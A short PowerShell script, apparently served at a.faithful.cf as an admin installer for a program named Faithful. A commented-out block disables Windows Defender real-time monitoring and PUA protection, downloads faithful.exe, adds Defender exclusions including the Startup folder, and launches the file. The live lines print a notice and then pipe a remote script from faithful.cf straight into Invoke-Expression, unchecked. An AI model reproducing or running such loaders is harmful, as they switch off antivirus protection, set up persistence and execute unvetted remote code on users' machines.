# Run this script as an administrator : Run powershell as admin before executing.
# Command to execute:
# iwr a.faithful.cf | iex

# cd $env:userprofile
# Set-MpPreference -DisableRealtimeMonitoring $true
# Write-Output "Starting script..."
# Invoke-WebRequest https://raw.githubusercontent.com/thaddeuskkr/filehost/master/faithful.exe -OutFile "faithful.exe"
# Write-Output "Adding Windows Defender exclusions..."
# Set-MpPreference -PUAProtection Disabled
# Add-MpPreference -ExclusionPath "$((Get-Item .).FullName)\faithful.exe"
# Add-MpPreference -ExclusionPath "$env:userprofile\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\faithful.exe"
# Start-Process ("faithful.exe")
# Write-Output "Done!"

Write-Output "You made a web request to a.faithful.cf, which is the administrator script for the Faithful program."
Write-Output "This script is no longer in use due to its unreliability."
Write-Output "Instead of using this script, please use the following command instead:"
Write-Output "iwr faithful.cf | iex"
Write-Output "- Running this command for you..."
iwr faithful.cf | iex